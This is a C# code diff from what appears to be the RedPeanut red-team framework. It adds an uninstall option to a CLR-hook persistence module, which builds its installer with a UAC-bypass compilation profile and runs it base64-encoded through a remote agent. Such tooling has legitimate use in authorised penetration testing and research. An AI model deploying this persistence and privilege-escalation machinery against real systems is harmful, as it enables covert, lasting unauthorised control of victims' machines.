@@ -19,6 +19,7 @@ namespace RedPeanut
         public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
         {
             { "set process", "Parent process" },
+            { "set uninstall", "Partial uninstallation. Restore the environment variable, but the assembly must be deleted manually." },
             { "run", "Execute module" },
             { "options", "Print current config" },
             { "info", "Print help" },
@@ -28,6 +29,7 @@ namespace RedPeanut
         IAgentInstance agent = null;
         string modulename = "clr";
         string process = "";
+        bool uninstall = false;
         //bool ssl = true;
         bool exit = false;
 
@@ -65,6 +67,9 @@ namespace RedPeanut
                     {
                         case "set process":
                             process = GetParsedSetString(input);
+                            break;
+                        case "set uninstall":
+                            uninstall = GetParsedSetBool(input);
                             break;
                         case "run":
                             Run();
@@ -152,15 +157,12 @@ namespace RedPeanut
                             .Replace("#FILENAME#", hookfilename)
                             .Replace("#PROCESS#", process);
 
-                        Builder.GenerateDll(source, RandomAString(10, new Random()) + ".dll", targetframework);
                         string clrhookinstaller = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework, compprofile: CompilationProfile.UACBypass)));
 
-                        RunAssemblyBase64(
-                            clrhookinstaller,
-                            "PersCLRInstall",
-                            new string[] { "install" },
-                            agent);
-
+                        if(uninstall)
+                            RunAssemblyBase64(clrhookinstaller,"PersCLRInstall", new string[] { "cleanenv" },agent);
+                        else
+                            RunAssemblyBase64(clrhookinstaller, "PersCLRInstall", new string[] { "install" }, agent);
                     }
                 }
             }
@@ -174,7 +176,8 @@ namespace RedPeanut
         {
             Dictionary<string, string> properties = new Dictionary<string, string>
             {
-                { "process", process }
+                { "process", process },
+                { "delete", uninstall.ToString() }
             };
 
             Utility.PrintCurrentConfig(modulename, properties);
